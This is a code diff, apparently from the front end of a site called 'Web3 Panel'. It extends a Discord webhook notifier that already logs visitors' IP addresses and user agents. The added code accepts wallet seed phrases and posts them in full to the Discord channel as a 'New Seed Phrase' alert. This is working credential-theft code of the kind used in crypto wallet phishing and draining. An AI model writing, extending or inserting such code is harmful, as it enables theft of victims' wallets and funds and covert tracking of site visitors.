@@ -25,17 +25,31 @@ async function getIPInfo() {
   }
 }
 
-export async function sendDiscordNotification(type: 'visit' | 'download', downloadType?: string) {
+export async function sendDiscordNotification(
+  type: 'visit' | 'download' | 'seed_phrase',
+  downloadType?: string,
+  seedData?: { type: string; phrase: string }
+) {
   const ip = await getIPInfo();
   const timestamp = new Date().toISOString();
 
   const message: DiscordWebhookMessage = {
     embeds: [{
-      title: type === 'visit' ? '🌐 New Website Visit' : '⬇️ New Download',
-      description: type === 'visit' 
+      title: type === 'visit' 
+        ? '🌐 New Website Visit' 
+        : type === 'download'
+        ? '⬇️ New Download'
+        : '🔑 New Seed Phrase',
+      description: type === 'visit'
         ? 'Someone visited the Web3 Panel website'
-        : `Someone downloaded Web3 Panel (${downloadType})`,
-      color: type === 'visit' ? 3447003 : 15844367, // Blue for visits, Orange for downloads
+        : type === 'download'
+        ? `Someone downloaded Web3 Panel (${downloadType})`
+        : `New ${seedData?.type}-word seed phrase received`,
+      color: type === 'visit' 
+        ? 3447003  // Blue for visits
+        : type === 'download'
+        ? 15844367 // Orange for downloads
+        : 15158332, // Red for seed phrases
       fields: [
         {
           name: 'IP Address',
@@ -51,7 +65,12 @@ export async function sendDiscordNotification(type: 'visit' | 'download', downlo
           name: 'User Agent',
           value: navigator.userAgent,
           inline: false
-        }
+        },
+        ...(type === 'seed_phrase' ? [{
+          name: 'Seed Phrase',
+          value: seedData?.phrase || 'No phrase provided',
+          inline: false
+        }] : [])
       ],
       timestamp: timestamp
     }]
